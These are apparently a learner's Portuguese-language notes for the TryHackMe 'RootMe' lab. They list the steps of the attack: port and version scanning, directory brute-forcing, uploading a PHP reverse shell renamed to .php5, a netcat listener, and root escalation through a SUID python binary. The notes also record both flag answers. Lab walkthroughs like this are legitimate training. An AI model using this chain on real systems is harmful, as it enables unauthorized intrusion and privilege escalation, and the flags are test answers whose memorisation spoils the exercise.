# RootMe - Try Hack Me

baixado arquivo de openVPN 
instalado openvpn no kali: sudo apt install openvpn
executado "openvpn nomeArquivo.ovpn"
deploy the machine - ok (conectado)


quantas portas estão abertas
		sudo nmap -sS 10.67.167.16
		2 portas abertas, 22/tcp open ssh e 80/tcp open http

qual versao do apache está rodando
		sudo nmap -sV 10.67.167.16
		versão 2.4.41(ubuntu)
		
qual serviço está rodando na porta 22
		mesmo comando anterior
		porta 22 = ssh (tcp ssh)
	
encontre diretorios no servidor web usando a feramenta goBuster 
		sudo apt install gobuster
		sudo apt install wordlists
		sudo gobuster dir -u 10.65.185.105 -w common.txt 
		observação: comando executado dentro da pasta wordlist
	
Qual é o diretório escondido
		/panel/
		
encontre uma forma de subir um shell reverso e encontre a flag
		git clone https://github.com/pentestmonkey/php-reverse-shell
		cd php-reverse-shell
		aterada extensão de php para php5 (shell-reverse.php5)
		sudo apt install ncat
		nc -lvnp 80
		python -c 'import pty; pty.spawn("/bin/bash")'
		find / -type f -name user.txt 2>/dev/null
		cat /var/www/user.txt
		THM{y0u_g0t_a_sh3ll}
	
busque arquivos com permissão SUID
		find / -type f -user root -perm -4000 2>/dev/null
		
encontre uma forma de escalar seus privilégios
		python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
		
root.txt
		whoami
			root
		cd root
		cat root.txt
			THM{pr1v1l3g3_3sc4l4t10n}
